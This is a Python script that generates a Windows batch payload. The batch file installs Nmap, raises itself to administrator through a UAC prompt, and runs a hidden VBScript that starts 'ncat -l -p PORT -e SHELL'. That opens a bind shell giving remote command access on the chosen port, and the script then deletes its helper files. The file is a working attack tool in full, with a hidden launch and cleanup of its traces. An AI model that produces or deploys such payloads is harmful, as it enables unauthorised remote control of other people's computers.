import subprocess


def generate_payload(port, shell, ouput_file):

    batch_script = f"""@echo off

echo MSGBOX "This program will download Nmap, please proceed with CAUTION!!" > %temp%\TEMPmessage.vbs
call %temp%\TEMPmessage.vbs
del %temp%\TEMPmessage.vbs /f /q

:: Netcat install (assume user doesnt have)
winget install -e --id Insecure.Nmap

:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\\elevate.vbs"
    cscript "%temp%\\elevate.vbs"
    del "%temp%\\elevate.vbs"
    exit /b
)
::Initialise Var
set PORT={port}
set SHELL={shell}

:: Run the main command 
echo Waiting...
echo Set objShell = CreateObject("WScript.Shell") > run_silent.vbs
echo objShell.Run "ncat -l -p %PORT% -e %SHELL%", 0, False >> run_silent.vbs

:: Run the VBScript 
cscript //nologo run_silent.vbs

:: Clean up the VBScript after execution
del run_silent.vbs

exit
"""
    try:
        with open(ouput_file+".bat", "w") as f:
            f.write(batch_script)
            print(f"\n\033[38;5;69mSUCCESS!!! \033[0mCREATED {ouput_file}.bat ")

    except subprocess.CalledProcessError as e:
        print(f"Error executing batch script: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")